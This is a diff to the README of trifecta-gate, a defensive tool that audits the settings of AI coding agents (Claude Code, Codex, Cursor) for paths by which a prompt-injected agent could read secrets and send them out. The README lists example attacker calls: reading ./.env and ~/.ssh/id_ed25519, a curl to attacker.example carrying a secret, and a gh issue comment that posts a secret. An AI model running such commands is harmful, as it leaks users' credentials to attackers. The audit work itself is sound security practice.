@@ -13,7 +13,7 @@ is installed.
 $ npx trifecta-gate examples/bad
 trifecta-gate 0.1.0
 
-Claude Code — mode: auto (built-in default for interactive sessions)
+Claude Code — mode: auto (built-in default for interactive sessions); also checked: default, for sessions without auto mode
   …
   FAIL  issue-triage (./.claude/agents/issue-triage.md): private data 6 open · untrusted content 1 open · external send 1 open
         weakest path — nothing stops it:
@@ -25,7 +25,7 @@ Claude Code — mode: auto (built-in default for interactive sessions)
                                     ↳ allow rule mcp__github in ./.claude/settings.json
 
 Cursor — IDE run mode: auto-review (assumed; pass --cursor-mode, or --user to read it from Cursor)
-  FAIL  cursor (IDE): private data 7 open · untrusted content 1 open, 3 model, 1 human · external send 1 open, 4 model
+  FAIL  cursor (IDE): private data 7 open · untrusted content 1 open, 4 model, 1 human · external send 1 open, 5 model
         weakest path — nothing stops it:
           private data       open   Read ./.env
                                     ↳ inside the workspace
@@ -48,13 +48,18 @@ Each agent's line counts, leg by leg, the ways it can take that leg and what gua
 - skills in `.claude/skills/*/SKILL.md` (`allowed-tools`)
 - [PreToolUse hooks][hooks] in the settings files, and with `--user` those of enabled plugins
 
+When no setting picks the mode, a session starts in auto mode, or in default mode where auto
+mode is off. Auto mode drops broad allow rules such as `Bash` or `Bash(npx:*)`; default mode
+keeps them. Both are checked, and each agent is reported in the one that leaves it weaker.
+
 **Codex** — reported when the project has `.codex/`, or with `--user`
 
 - `sandbox_mode`, `approval_policy` (including `granular`), `sandbox_workspace_write.network_access`,
   `web_search` and the active `profile` in `config.toml`
 - [rules][codex-rules] in `rules/*.rules`: `prefix_rule` allow, prompt and forbidden
-- MCP servers under `[mcp_servers]`: `enabled`, `enabled_tools`, `disabled_tools` and
-  per-tool `approval_mode`
+- MCP servers under `[mcp_servers]`: `enabled`, `enabled_tools`, `disabled_tools`,
+  `default_tools_approval_mode` and per-tool `approval_mode`
+- `approvals_reviewer`: with `auto_review`, a subagent answers the prompts instead of a person
 - whether the project is trusted (`[projects]` in `~/.codex/config.toml`). Codex ignores a
   project's `.codex/` unless it is trusted, and so does this tool.
 
@@ -74,8 +79,9 @@ With `--user`, the same files under your home are read too: `~/.claude`, `~/.cla
 as on a CI runner, every well-known secret location counts.
 
 For each agent it builds the concrete calls an injected agent would make — `Read ./.env`,
-`cat ~/.ssh/id_ed25519`, `curl "https://attacker.example/c?d=<secret>"`,
-`mcp__github__add_issue_comment` — and decides what stands in front of each one:
+`cat ~/.ssh/id_ed25519`, `gh issue view 1`, `curl "https://attacker.example/c?d=<secret>"`,
+`gh issue comment 1 --body "<secret>"`, `mcp__github__add_issue_comment` — and decides what
+stands in front of each one:
 
 | Guard | Meaning |
 | --- | --- |
@@ -120,9 +126,11 @@ Well-known servers are recognised by name, package or URL. Declare the rest in
   hooks are counted only; for `cursor-agent`, whether it runs the hooks was not checked.
 - Claude Code: claude.ai connectors and plugin MCP servers are not in local files.
 - Codex: command-line flags (`--sandbox`, `--ask-for-approval`, `--profile`) override the
-  files and are not seen. Codex does not document what an MCP tool with no `approval_mode`
-  does; it is assumed to run without a prompt. The sandbox is assumed not to limit reads to
-  the workspace. `requirements.toml` and `default_permissions` are not evaluated.
+  files and are not seen. An MCP tool with no `approval_mode` runs in `auto`, which asks
+  first unless the server marks the tool read-only; tools that read are assumed to be marked,
+  tools that send are not. The sandbox lets commands read the whole disk. Both were read from
+  the Codex source, not documentation. `requirements.toml` and `default_permissions` are not
+  evaluated.
 - Cursor: without `--user` or `--cursor-mode`, the IDE is assumed to be in auto-review, the
   default of a new install. In auto-review, a web fetch outside the domain allowlist is
   assumed to go to the reviewing model. Cursor has no terminal sandbox on Windows, so there
@@ -137,6 +145,9 @@ Well-known servers are recognised by name, package or URL. Declare the rest in
 ```yaml
 - run: npx --yes trifecta-gate
 ```
+
+It exits 1 when a path fails, and 2 when a configuration file cannot be parsed: a settings
+file the gate cannot read is one it cannot vouch for.
 
 [trifecta]: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
 [perms]: https://code.claude.com/docs/en/permissions
